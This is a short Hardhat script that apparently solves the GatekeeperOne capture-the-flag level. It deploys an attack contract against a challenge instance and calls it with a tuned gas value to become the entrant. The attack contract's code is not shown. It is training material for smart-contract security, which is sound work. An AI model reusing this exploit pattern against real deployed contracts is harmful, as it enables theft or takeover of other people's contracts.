import { ethers } from "hardhat";
import { GatekeeperOne__factory } from "../typechain/factories/contracts/GatekeeperOne__factory";
import { GatekeeperOneAttack__factory } from "../typechain/factories/contracts/GatekeeperOneAttack__factory";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address =  "0x073F8EB908AbD92d36612CF5C5861859a314561e";
    let gatekeeperOne = new GatekeeperOne__factory(signer).attach(instance_address);
    console.log(await gatekeeperOne.entrant());

    
    let attack = await new GatekeeperOneAttack__factory(signer).deploy(gatekeeperOne.address);
    await attack.deployed();

    // let tx = await attack.attack();
    // await tx.wait();
    let tx = await attack.callEnter(82166);
    await tx.wait();
    console.log(await gatekeeperOne.entrant());

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
